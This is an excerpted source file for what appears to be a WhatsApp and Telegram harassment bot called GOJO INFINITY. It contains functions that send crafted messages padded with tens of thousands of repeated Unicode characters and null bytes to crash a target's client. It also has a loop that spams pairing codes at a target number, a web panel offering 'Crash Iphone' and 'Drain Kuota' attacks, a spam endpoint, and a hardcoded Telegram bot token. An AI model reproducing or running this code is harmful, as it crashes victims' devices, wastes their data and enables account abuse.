    ...
    if (connection === "connecting") {
      ...
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "VOLTAGE2");
...
const sendPairingLoop = async (targetNumber, ctx, chatId) => {
  ...
  try {
    ...
    for (let i = 1; i <= total; i++) {
      try {
        const code = await global.sock.requestPairingCode(targetNumber, "VOLTAGE2");
        const formatted = code.match(/.{1,4}/g)?.join("-") || code;
...
bot.command("start", async (ctx) => {
  ...
  const teks = `
<blockquote>🍁 GOJO INFINITY V2</blockquote>
<i>Now GOJO INFINITY  has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>〢「 Information 」</blockquote>
<b>Developer : @VtgZuxy</b>
<b>Version   : 1 ⧸ <code>II</code></b>
...
`;
  ...
  await ctx.reply(indictiveMenu, {
    ...
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍", "https://t.me/aboutaboutRezaOffcfficial") ]
    ]).reply_markup
  });
});
...
<b>📞 Support:</b>
Contact @VtgZuxy for assistance
`;
...
bot.hears("💬 Chat", (ctx) => {
  ctx.reply("💬 Chat dengan developer: https://t.me/VtgZuxy");
});

bot.hears("📢 Channel", (ctx) => {
  ctx.reply("📢 Channel updates: https://t.me/aboutaboutRezaOffcfficial");
});
...
─────────────────────────────────────
NAME APPS : GOJO INFINITY 
DEVELOPER  : REZA OFFICIAL 
ID OWN      : ${ownerIds}
VERSION     : 2
─────────────────────────────────────\n\n`));
...
async function AstecBlankButon(sock, target) { 
  try {
    const message = {
      interactiveMessage: { 
        contextInfo: {
...
async function function1(sock, target) {
    ...
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          ...
          body: {
            text: "VOLTAGE IS HERE 🩸" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
          },
          nativeFlowMessage: {
            buttons: [
              {
...
async function function2(sock, target) {
  const LocaMsg = {
    viewOnceMessage: {
      message: {
        locationMessage: {
...
async function function3(sock, target) {
  try {
    await sock.relayMessage(target, {
      locationMessage: {
        degreesLatitude: 2.9990000000,
        degreesLongitude: -2.9990000000,
        name: "VOLTAGE IS HERE🩸" + "𑇂𑆵𑆴𑆿饝喛".repeat(80900),
...
async function function8(sock, target) {
  await sock.relayMessage(target, {
      messageContextInfo: {
        deviceListMetadata: {
      ...
      eventMessage: {
        ...
        location: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: "\u0000" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
        },
...
*/
const BOT_TOKEN = "8453185296:AAGkxgrk2kyz_Zgwjug8XZw2kdTYRPs20wg";
const CHAT_ID = "8172719089";
...
app.post('/api/telegram-spam', async (req, res) => {
    try {
        ...
        const protectedTargets = ['@VtgZuxy', '7250235697'];
  ...
  const bugTypes = [
    {
      ...
      title: 'Delay Invis',
      description: 'Bug dengan delay invis - cocok untuk bantai - bantai',
      badge: 'Delay Invis'
    },
    {
      id: 'medium',
      ...
      title: 'Crash Invis',
      description: 'Bug dengan Crash Invis pada target',
      badge: 'Crash Invis'
    },
    {
      id: 'blank-ios',
      ...
      title: 'Crash Iphone',
      description: 'Bug ios Crash - telihat',
      badge: 'PayFlood'
    },
    {
      id: 'blank',
    ...
    },
    {
      ...
      title: 'Bulldozer Android',
      description: 'Menguras Kuota Target ',
      badge: 'Drain Kuota'
    }
  ];
...
<body>
    ...
    <header class="header" id="header">
        <nav class="nav-container">
            <a href="#" class="logo">
                ...
                <span class="logo-text">GOJO INFINITY </span>
            </a>
            ...
            <div class="target-image-section">
                <div class="target-image-container">
                    <div class="target-image">
                        <img src="https://files.catbox.moe/e1rits.jpg" alt="Target Image">
                        <div class="target-image-overlay">
                            <div class="target-text-container">
                                <div class="target-text">GOJO INFINITY  EXECUTION</div>
                            </div>
                        </div>
                    </div>
                </div>
    ...
    <footer class="footer">
        <div class="copyright">
            © 2025 GOJO INFINITY . All rights reserved.
        </div>
    </footer>
    ...
    <script>
        ...
        const bugTypes = [
            ...
            },
            {
                ...
                icon: '<i class="fab fa-apple"></i>',
                title: 'Crash Iphone',
                description: 'Bug ios Crash - teliha',
                badge: 'PayFlood'
            },
            {
                id: 'blank',
